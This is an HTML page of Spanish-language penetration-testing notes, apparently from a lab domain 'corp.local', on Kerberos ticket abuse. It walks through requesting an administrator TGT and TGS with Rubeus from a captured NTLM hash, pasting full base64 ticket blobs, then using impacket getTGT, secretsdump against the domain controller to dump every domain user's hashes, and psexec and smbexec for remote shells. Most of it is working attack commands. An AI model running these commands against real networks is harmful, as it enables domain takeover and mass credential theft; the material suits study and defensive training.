<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ASK-TGT/TGS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ASK-TGT/TGS</h1><br/><p><h2>Si somos capaces de volcar el TGT y la sessionkey de un usuario con privilegios del dominio seremos capaces de mucho mas que simplemente inyectarlo en la sesión de un usuario sin privilegios.</h2></p><p></p><p></p><p></p><p>Para esto Rubeus cuenta con algunas opciones.</p><p></p><p>Si hemos interceptado el hash NTLM de un usuario como el que tenemos de administrador, podemos usar una función de Rubeus para obtener un TGT sin necesidad de importarlo en la sesión de usuario sin privilegios.</p><p>Esto se puede realizar sin privilegios de administración.</p><p></p><p><div class="codebox"><pre><br />NTLM<span style="color:#000000;font-weight:700">--</span>&gt; a87f3a337d73085c45f9416be5787d86</pre></div></p><p></p><p>Podemos verificar antes que nos encontramos en el usuario empleado1 sin privilegios y que el ticket es el correcto:</p><p><img src="images/40-1.png" alt="images/40-1.png" /></p><p></p><p>Ahora si le indicamos a Rubeus:</p><p></p><p><div class="codebox"><pre><br />.<span style="color:#000000;font-weight:700">\</span>Rubeus.exe asktgt <span style="color:#000000;font-weight:700">/</span>domain<span style="color:#000000;font-weight:700">:</span>corp.local <span style="color:#000000;font-weight:700">/</span>user<span style="color:#000000;font-weight:700">:</span>administrador <span style="color:#000000;font-weight:700">/</span>rc4<span style="color:#000000;font-weight:700">:</span>a87f3a337d73085c45f9416be5787d86 </pre></div></p><p></p><p>Como vemos podemos obtener el TGT a nombre del administrador y su sessionkey sin necesidad de volcar nada de ninguna sesión ya que lo hemos pedido nosotros:</p><p><img src="images/40-2.png" alt="images/40-2.png" /></p><p></p><p>Ahora como en la anterior sesión podemos utilizar de forma más personal con diferentes herramientas sin necesidad de que windows lo haga de forma transparente.</p><p></p><p>Igual que antes vamos a llevarlo a kali para formatear el ticket al igual que antes.</p><p>El proceso es sencillo:</p><p>En Emacs:<ul><li>Seleccionamos todo el texto</p><p></li></ul><img src="images/40-3.png" alt="images/40-3.png" /></p><p><ul><li>Pulsamos Alt+x y escribimos replace-string, enter, pulsamos una vez espacio, enter y enter.</p><p></li></ul><img src="images/40-4.png" alt="images/40-4.png" /></p><p></p><p><img src="images/40-5.png" alt="images/40-5.png" /></p><p></p><p>Recordar quitar todos los saltos de linea de forma que no queden espacios.</p><p></p><p><div class="codebox"><pre><br />doIFqDCCBaSgAwIBBaEDAgEWooIEvjCCBLphggS2MIIEsqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggR6MIIEdqADAgESoQMCAQKiggRoBIIEZM2W4ARERmwsZynm<span style="color:#000000;font-weight:700">+</span>kHG8AsSfB7qHXwzH3vTwZnTpGqXNhQqMgB7MHOAlZkyTQ8X3CNzDvm1eL<span style="color:#000000;font-weight:700">/</span>pyop2dUMtTsv3YpiMseJ2Wep9I<span style="color:#000000;font-weight:700">/</span>EijVyciMJrWC74cthBDGRe8UDHJk<span style="color:#000000;font-weight:700">/</span>rhvLPap5WDUPQeb5TEcVgnLSISqeA5JMDoH29xic1xKDEERHNyozMw3t3pQL6eD<span style="color:#000000;font-weight:700">+</span>WlhrZEakucXfmgpMXiuHwiYkql22Ic3zruQzKhJQsBMLKqK2kzAJVdFs4JOY76ZWIFlYcwYhSzMGPveB6hETEmjIgbrhVUDQtRdVJ2BvH<span style="color:#000000;font-weight:700">/</span>Hd87Id7Xz76FDOOwOKAt1y6TIg0750Jv0<span style="color:#000000;font-weight:700">+</span>Myk08JzskYepSbmQfdJI2GNDyTia06uEdDLc0GweFYzzbTEi4Nfvn9ztydpPpyAcnbR73m<span style="color:#000000;font-weight:700">+</span>qytjLbtzhtgafw6smgnYirLdFGHNanSqwmSSxXBNfz<span style="color:#000000;font-weight:700">+</span>vpMh4Tso3DowHb<span style="color:#000000;font-weight:700">++</span>foh02k9VJ47o9JeaMfoJAOJdTRj5oi4rjCjkG4rtkaeg2FNfkVwbF35IC4PWOEgHkbEYM8i1coaAE0J2uLT0eR3mS2ODGqGMHvbZ4tvO5izZn37ANXznNcIJpAtm7jkQgbv1<span style="color:#000000;font-weight:700">+</span>gWbck<span style="color:#000000;font-weight:700">/</span>sSS6zO1lQKaHd<span style="color:#000000;font-weight:700">/</span>F7BbdzL43KF3BwiOwYjo61uFwNqERswrzRWDWt<span style="color:#000000;font-weight:700">+</span>E<span style="color:#000000;font-weight:700">+</span>NhKh3jA5Gtuxjn<span style="color:#000000;font-weight:700">+</span>SLcZSeXgTn4lk4l5eOxwofzqZyslT<span style="color:#000000;font-weight:700">/</span>rDuCkbbRgjvtyiwinQsw1pg8unKDtsSoO<span style="color:#000000;font-weight:700">/</span><span style="color:#729fcf;font-weight:400">pS</span><span style="color:#000000;font-weight:700">+</span>Tvnu8zKNViZkcUBBzB<span style="color:#000000;font-weight:700">+</span>Fqe7p<span style="color:#000000;font-weight:700">+</span>xXntnGk82fW3HocnSrE9CFl2VCiLLG9uGiYpSU6je4UzYT0<span style="color:#000000;font-weight:700">/</span>5kVb6dF<span style="color:#000000;font-weight:700">/</span>43O6UtcqWH8graXxmwucBI0IAQDUrC9yo2gfHmzWuFBX5uQYU1fKBTR3cHXZG5hDzfymwsccsTwxvqOYYFQBtf2tlk38JQpopKdF98viYCDuUd0b7cNi0yRhrgMZ4I8s<span style="color:#000000;font-weight:700">+</span>NH3Sl8rBUNnGuz9e8GffhMGDP<span style="color:#000000;font-weight:700">/</span>9WZqEhLZphp<span style="color:#000000;font-weight:700">+</span>taO1MzOo8mmBkyBWFu<span style="color:#000000;font-weight:700">+</span>2xNDgDwcjgTakPhHE6YZQlcG28v6jg91pf6kMQ9jC5jV<span style="color:#000000;font-weight:700">+</span>H29IIFaaFSudc3Ryphx<span style="color:#000000;font-weight:700">/</span>TUHTCHfpgZlZAmzAs72X8FTR<span style="color:#000000;font-weight:700">/</span>aqELaA5rr<span style="color:#000000;font-weight:700">+</span>eL<span style="color:#000000;font-weight:700">+</span>uup5PHfLiNt12NoIFaFTEGsFNm7RF8sI1zd2yIF3bnOXG52jHWuQ4xAXnXjwxur<span style="color:#000000;font-weight:700">+</span>aQYqfN2oLF8oxx<span style="color:#000000;font-weight:700">/</span>ZblO9<span style="color:#000000;font-weight:700">+</span>JY8l4nPQ04v3kE0lPTWp0ZZNqchx19cXwMY3DTu<span style="color:#000000;font-weight:700">+</span>K<span style="color:#000000;font-weight:700">/</span>1txchpjUcNB0bwt9FK3PoEroutRhUx0riNd98PUvQnGc2XZRcUCLU3NAUiqBMWPfasfsVZfscA<span style="color:#000000;font-weight:700">/</span>lxJWjkOWFWi6oRklxy46wQQjHh0PXk5y6HokITdCxjLnZlzBJWqN<span style="color:#000000;font-weight:700">/</span>ahy19rAwld9ojVldbXOrs6Quh4WqA<span style="color:#000000;font-weight:700">+</span>Th<span style="color:#000000;font-weight:700">/</span>UhA655YPeNzpuF9QmeQu3FTxV996UYyMui4nceVTV4XLcDcdNDO3PpZPYDtubGZK6S7JVp08w5ft<span style="color:#000000;font-weight:700">+</span>fmi4txmzyXOE7UJ5NCsTmLxHo4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigGzAZoAMCARehEgQQeDuchPGA3Givxf7Uo8<span style="color:#000000;font-weight:700">+</span>SgqEMGwpDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYWRvcqMHAwUAQOEAAKURGA8yMDI0MDMwNTA5MDAxN1qmERgPMjAyNDAzMDUxOTAwMTdapxEYDzIwMjQwMzEyMDkwMDE3WqgMGwpDT1JQLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwpjb3JwLmxvY2Fs</pre></div></p><p></p><p></p><p></p><p>Esto es útil para poder utilizarlo en nuestra propia máquina windows en la que tengamos control de seguridad y evitar así problemas con antivirus, etc y pedir TGS en nombre del usuario de dominio al que hayamos comprometido el hash.</p><p>Ahora si lo copiamos y en Rubeus:</p><p></p><p><div class="codebox"><pre><br />.<span style="color:#000000;font-weight:700">\</span>Rubeus.exe asktgs <span style="color:#000000;font-weight:700">/</span>ticket<span style="color:#000000;font-weight:700">:</span>doIFqDCCBaSgAwIBBaEDAgEWooIEvjCCBLphggS2MIIEsqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggR6MIIEdqADAgESoQMCAQKiggRoBIIEZM2W4ARERmwsZynm<span style="color:#000000;font-weight:700">+</span>kHG8AsSfB7qHXwzH3vTwZnTpGqXNhQqMgB7MHOAlZkyTQ8X3CNzDvm1eL<span style="color:#000000;font-weight:700">/</span>pyop2dUMtTsv3YpiMseJ2Wep9I<span style="color:#000000;font-weight:700">/</span>EijVyciMJrWC74cthBDGRe8UDHJk<span style="color:#000000;font-weight:700">/</span>rhvLPap5WDUPQeb5TEcVgnLSISqeA5JMDoH29xic1xKDEERHNyozMw3t3pQL6eD<span style="color:#000000;font-weight:700">+</span>WlhrZEakucXfmgpMXiuHwiYkql22Ic3zruQzKhJQsBMLKqK2kzAJVdFs4JOY76ZWIFlYcwYhSzMGPveB6hETEmjIgbrhVUDQtRdVJ2BvH<span style="color:#000000;font-weight:700">/</span>Hd87Id7Xz76FDOOwOKAt1y6TIg0750Jv0<span style="color:#000000;font-weight:700">+</span>Myk08JzskYepSbmQfdJI2GNDyTia06uEdDLc0GweFYzzbTEi4Nfvn9ztydpPpyAcnbR73m<span style="color:#000000;font-weight:700">+</span>qytjLbtzhtgafw6smgnYirLdFGHNanSqwmSSxXBNfz<span style="color:#000000;font-weight:700">+</span>vpMh4Tso3DowHb<span style="color:#000000;font-weight:700">++</span>foh02k9VJ47o9JeaMfoJAOJdTRj5oi4rjCjkG4rtkaeg2FNfkVwbF35IC4PWOEgHkbEYM8i1coaAE0J2uLT0eR3mS2ODGqGMHvbZ4tvO5izZn37ANXznNcIJpAtm7jkQgbv1<span style="color:#000000;font-weight:700">+</span>gWbck<span style="color:#000000;font-weight:700">/</span>sSS6zO1lQKaHd<span style="color:#000000;font-weight:700">/</span>F7BbdzL43KF3BwiOwYjo61uFwNqERswrzRWDWt<span style="color:#000000;font-weight:700">+</span>E<span style="color:#000000;font-weight:700">+</span>NhKh3jA5Gtuxjn<span style="color:#000000;font-weight:700">+</span>SLcZSeXgTn4lk4l5eOxwofzqZyslT<span style="color:#000000;font-weight:700">/</span>rDuCkbbRgjvtyiwinQsw1pg8unKDtsSoO<span style="color:#000000;font-weight:700">/</span><span style="color:#729fcf;font-weight:400">pS</span><span style="color:#000000;font-weight:700">+</span>Tvnu8zKNViZkcUBBzB<span style="color:#000000;font-weight:700">+</span>Fqe7p<span style="color:#000000;font-weight:700">+</span>xXntnGk82fW3HocnSrE9CFl2VCiLLG9uGiYpSU6je4UzYT0<span style="color:#000000;font-weight:700">/</span>5kVb6dF<span style="color:#000000;font-weight:700">/</span>43O6UtcqWH8graXxmwucBI0IAQDUrC9yo2gfHmzWuFBX5uQYU1fKBTR3cHXZG5hDzfymwsccsTwxvqOYYFQBtf2tlk38JQpopKdF98viYCDuUd0b7cNi0yRhrgMZ4I8s<span style="color:#000000;font-weight:700">+</span>NH3Sl8rBUNnGuz9e8GffhMGDP<span style="color:#000000;font-weight:700">/</span>9WZqEhLZphp<span style="color:#000000;font-weight:700">+</span>taO1MzOo8mmBkyBWFu<span style="color:#000000;font-weight:700">+</span>2xNDgDwcjgTakPhHE6YZQlcG28v6jg91pf6kMQ9jC5jV<span style="color:#000000;font-weight:700">+</span>H29IIFaaFSudc3Ryphx<span style="color:#000000;font-weight:700">/</span>TUHTCHfpgZlZAmzAs72X8FTR<span style="color:#000000;font-weight:700">/</span>aqELaA5rr<span style="color:#000000;font-weight:700">+</span>eL<span style="color:#000000;font-weight:700">+</span>uup5PHfLiNt12NoIFaFTEGsFNm7RF8sI1zd2yIF3bnOXG52jHWuQ4xAXnXjwxur<span style="color:#000000;font-weight:700">+</span>aQYqfN2oLF8oxx<span style="color:#000000;font-weight:700">/</span>ZblO9<span style="color:#000000;font-weight:700">+</span>JY8l4nPQ04v3kE0lPTWp0ZZNqchx19cXwMY3DTu<span style="color:#000000;font-weight:700">+</span>K<span style="color:#000000;font-weight:700">/</span>1txchpjUcNB0bwt9FK3PoEroutRhUx0riNd98PUvQnGc2XZRcUCLU3NAUiqBMWPfasfsVZfscA<span style="color:#000000;font-weight:700">/</span>lxJWjkOWFWi6oRklxy46wQQjHh0PXk5y6HokITdCxjLnZlzBJWqN<span style="color:#000000;font-weight:700">/</span>ahy19rAwld9ojVldbXOrs6Quh4WqA<span style="color:#000000;font-weight:700">+</span>Th<span style="color:#000000;font-weight:700">/</span>UhA655YPeNzpuF9QmeQu3FTxV996UYyMui4nceVTV4XLcDcdNDO3PpZPYDtubGZK6S7JVp08w5ft<span style="color:#000000;font-weight:700">+</span>fmi4txmzyXOE7UJ5NCsTmLxHo4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigGzAZoAMCARehEgQQeDuchPGA3Givxf7Uo8<span style="color:#000000;font-weight:700">+</span>SgqEMGwpDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYWRvcqMHAwUAQOEAAKURGA8yMDI0MDMwNTA5MDAxN1qmERgPMjAyNDAzMDUxOTAwMTdapxEYDzIwMjQwMzEyMDkwMDE3WqgMGwpDT1JQLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwpjb3JwLmxvY2Fs <span style="color:#000000;font-weight:700">/</span>service<span style="color:#000000;font-weight:700">:</span>cifs<span style="color:#000000;font-weight:700">/</span>DC01.corp.local </pre></div></p><p></p><p>Aquí tenemos indicado el request de un TGS para el servicio cifs (consumo de ficheros) del equipo DC01 en nombre de administrador.</p><p></p><p><img src="images/40-6.png" alt="images/40-6.png" /></p><p></p><p>Obtenemos por tanto el ticket.</p><p></p><p>Podemos formatear este nuevo ticket como antes:</p><p></p><p><div class="codebox"><pre><br />gEWooIE0TCCBM1hggTJMIIExaADAgEFoQwbCkNPUlAuTE9DQUyiIjAgoAMCAQKhGTAXGwRjaWZzGw9EQzAxLmNvcnAubG9jYWyjggSKMIIEhqADAgESoQMCAQOiggR4BIIEdKys8f0JI1M9tnVTkK6nRpkGhl6TQj5bIlEe7<span style="color:#000000;font-weight:700">+</span>Z0gKOBEvQNDYKPk7RVuo25eoc5oCUrltgmrOXezq8vEoxa2SKG7mgVn<span style="color:#000000;font-weight:700">+</span>6qFu26Frh<span style="color:#000000;font-weight:700">/</span>FlvBDPf5j5d1RtLx<span style="color:#000000;font-weight:700">+</span>nhmQMcwQ8TawWpi6m4zYXzQTlbQkn1Ad<span style="color:#000000;font-weight:700">/</span>LACW<span style="color:#000000;font-weight:700">+</span>Iq3SVLKJI0IJ90MwrU5t6po<span style="color:#000000;font-weight:700">+</span>nSxdcjkerTvTHY6<span style="color:#000000;font-weight:700">/</span>CNJ2etpp<span style="color:#000000;font-weight:700">+</span>uMqJkWG2wlw2rKtlDN5CQHTZLc<span style="color:#000000;font-weight:700">/</span>KOi7UFlvseMh0sDkT7d4erERTtmGH576kSy4TySgDGZPzGWpK<span style="color:#000000;font-weight:700">/</span>WHbWrSlcjXTEyj8H5ckNWeXSccBS45iuP<span style="color:#000000;font-weight:700">//</span>V3n<span style="color:#000000;font-weight:700">+</span>ZBM<span style="color:#000000;font-weight:700">/</span>cbRlOkSpM<span style="color:#000000;font-weight:700">/</span>Rf<span style="color:#000000;font-weight:700">/</span>fwSrukPYiFko<span style="color:#000000;font-weight:700">/</span>L7<span style="color:#000000;font-weight:700">/</span>WkmThBTNBxQ02x2yphzAKGERt<span style="color:#000000;font-weight:700">/</span>HgJw6FizCsL3yfxwZYfHTy56B406pOJVgVMK85keOLOEolI4hl4G6hiqCkzv7xzXMHWweGJR90XmLKrBX41ZYN8sytrwDMB1sUpndh<span style="color:#000000;font-weight:700">+</span>zBkSS45VDYnTxNt7ejJQQ<span style="color:#000000;font-weight:700">/</span>p2XCpq07l0DeSOWRxSlLqmkL7aPwT5<span style="color:#000000;font-weight:700">/</span>DqSaI3QrvZg<span style="color:#000000;font-weight:700">/</span>lACWeGs171kQEI463A6ubVkVBuHhFug9P7LS2CErchImbIgErbJcSn0OxTkJfGcFkBD4nrn6jbYNA9HDBWiKyLmXkMmzAIjvvOpJmWfU<span style="color:#000000;font-weight:700">+</span>BRy5NJvE6NrEo65fmDVfLckWSmDHnCcnxm4y2sqQvV47iIDR<span style="color:#000000;font-weight:700">/</span>NKYD3NAoJ5A2MKnFYLCTn7NQXgQYJUYu4Z31HmqL<span style="color:#000000;font-weight:700">/</span>dVz5G<span style="color:#000000;font-weight:700">/</span>BlJFpbDhNqmWmnz5obIRJbfKnMJgu3ISiJKuitE7M0XKouldwdoJfuzjsf3rkw7QGCSJxILih6NQkcjn51w6C6r7tj2BT0qeftU6m6KiiTEX19PTG2DigA<span style="color:#000000;font-weight:700">+</span>DUB5dZtfBlnmZJP16JInlpIkbOPmZXFn8q3mZNPi5Z8Bf8m<span style="color:#000000;font-weight:700">+</span>HFVxtgdQvZjBmkAIeROlWPTBV5Xe30bWnyrKv7X<span style="color:#000000;font-weight:700">/</span>u4C<span style="color:#000000;font-weight:700">+</span>IbaQrX2Rk9G6umeHvHdaj0bi4xQitJPR9HjHBtH<span style="color:#000000;font-weight:700">+</span>qLEf2boVEDH4vxtH<span style="color:#000000;font-weight:700">/</span>Hk5MAeFaOd8ons4iu<span style="color:#000000;font-weight:700">+</span>I86PhvJqWGvsPdb7wsdDEeNMN1Es6r74V4RJU2g8Zeg2VMRKI9q0i0s97V3bBiRzpSjYnYX0DAXYcq05LDmH86pH<span style="color:#000000;font-weight:700">+</span>gXrZuM<span style="color:#000000;font-weight:700">+</span>thxXXodE2JP6x1Lu15QltNHHacVvu0UFhIOCuykvF1tObChsRTQ64swpiLuUictBxm69ZxwMForS9Ro4Ms<span style="color:#000000;font-weight:700">+</span>46XSPkgNHuZklsS98XYTJRZacbe8<span style="color:#000000;font-weight:700">+</span>PwGe02eKMDa3hooqTON9Lu<span style="color:#000000;font-weight:700">+</span>MW83jM8snMITtY3QcY3BsDb<span style="color:#000000;font-weight:700">/</span>TMTqYHzXOnXxmPbSwtewCI7Nj<span style="color:#000000;font-weight:700">+</span>qXNQLgT4uMNcZJ6V2yWKRoPR2d2A9A54aOziwr<span style="color:#000000;font-weight:700">/</span>qvk3wzCdGOdolRvAe<span style="color:#000000;font-weight:700">/</span>dOupodUjxDxt91a<span style="color:#000000;font-weight:700">+</span><span style="color:#ce5c00;font-weight:400">74</span><span style="color:#000000;font-weight:700">/</span>YwtQreMmDZq4vFQ8Qu<span style="color:#000000;font-weight:700">/</span>OsqjjQSmJ3JQFLHiJVprwILXv52wGThvnmVLK0juiqWJLjqNzilwrP199K2FPw9es3<span style="color:#000000;font-weight:700">/</span>LKLUEtTCF3g8Gh9Sv8TdJvSq<span style="color:#000000;font-weight:700">/</span>2SuGWACkdvXUPS0KOB6DCB5aADAgEAooHdBIHafYHXMIHUoIHRMIHOMIHLoCswKaADAgESoSIEIPJ6UQoVn06lIsuj3r7bEy8Sahi2XQNQcdDbsLiwauUvoQwbCkNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhZG9yowcDBQBApQAApREYDzIwMjQwMzA1MDkxMjA5WqYRGA8yMDI0MDMwNTE5MDAxN1qnERgPMjAyNDAzMTIwOTAwMTdaqAwbCkNPUlAuTE9DQUypIjAgoAMCAQKhGTAXGwRjaWZzGw9EQzAxLmNvcnAubG9jYWw<span style="color:#000000;font-weight:700">=</span></pre></div></p><p></p><p>Y ahora le pedimos que importe con Rubeus ese ticket:</p><p></p><p><img src="images/40-7.png" alt="images/40-7.png" /></p><p></p><p><img src="images/40-8.png" alt="images/40-8.png" /></p><p></p><p>Y ya podríamos consumir ese servicio como administrador del domino desde nuestra máquina de atacante.</p><p></p><p></p><p></p><p></p><p><h1>DESDE LINUX:</h1></p><p></p><p>Vamos a ver que funciones podemos hacer con un TGT desde impacket:</p><p></p><p><div class="codebox"><pre><br />impacket-getTGT corp.local<span style="color:#000000;font-weight:700">/</span>administrador -hashes <span style="color:#000000;font-weight:700">:</span>a87f3a337d73085c45f9416be5787d86 </pre></div></p><p></p><p><img src="images/40-9.png" alt="images/40-9.png" /></p><p></p><p></p><p>Con este TGT podemos hacer cualquier cosa ya que podemos pedir cualquier TGS para cualquier servicio del dominio en nombre del administrador en este caso sin ni siquiera estar dentro del dominio como usuario, simplemente teniendo visibilidad.</p><p></p><p>En impacket hay una opción que nos permite usar autenticación kerberos y obtener las credenciales de la variable KRB5CCNAME de entorno:</p><p><img src="images/40-10.png" alt="images/40-10.png" /></p><p></p><p>Extraemos las credenciales del TGT anteriormente obtenido:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">export</span> <span style="color:#8ae234;font-weight:700">KRB5CCNAME</span>=<span style="color:#000000;font-weight:700">/</span>home<span style="color:#000000;font-weight:700">/</span>kali<span style="color:#000000;font-weight:700">/</span>Desktop<span style="color:#000000;font-weight:700">/</span>administrador.ccache</pre></div></p><p></p><p>Indicamos usuario y máquina objetivo de donde volcar la sam y no le indicamos contraseña ya que usará el TGT.</p><p></p><p><div class="codebox"><pre><br />mpacket-secretsdump corp.local<span style="color:#000000;font-weight:700">/</span>administrador@DC01.corp.local -k -no-pass</pre></div></p><p></p><p><img src="images/40-11.png" alt="images/40-11.png" /></p><p></p><p>Y claro, al ser el DC en su base de datos no solo se encuentran los usuarios locales o el de administrador sino todos los usuarios del dominio:</p><p></p><p><img src="images/40-12.png" alt="images/40-12.png" /></p><p></p><p>Incluso claves en cifrado AES256,128,RC4 de cada uno de ellos:</p><p></p><p><img src="images/40-13.png" alt="images/40-13.png" /></p><p></p><p>Siendo así posible con las técnicas que hemos visto antes poder realizar cualquier servicio en nombre de cualquier usuario del domino sin necesidad de crackear nada.</p><p></p><p></p><p></p><p>Además podemos utilizar otros módulos de Impacket:</p><p></p><p><div class="codebox"><pre><br />impacket-psexec corp.local<span style="color:#000000;font-weight:700">/</span>administrador@DC01.corp.local -k -no-pass</pre></div></p><p></p><p><img src="images/40-14.png" alt="images/40-14.png" /></p><p></p><p><img src="images/40-15.png" alt="images/40-15.png" /></p><p></p><p></p><p><div class="codebox"><pre><br />impacket-smbexec corp.local<span style="color:#000000;font-weight:700">/</span>administrador@DC01.corp.local -k -no-pass</pre></div></p><p></p><p><img src="images/40-16.png" alt="images/40-16.png" /></p><p></p><p>También podemos obtener TGS:</p><p></p><p><div class="codebox"><pre><br />-spn cifs<span style="color:#000000;font-weight:700">/</span>DC01.corp.local -no-pass -k corp.local<span style="color:#000000;font-weight:700">/</span>administrador</pre></div></p><p></p><p><img src="images/40-17.png" alt="images/40-17.png" /></p></div>
</body>
</html>
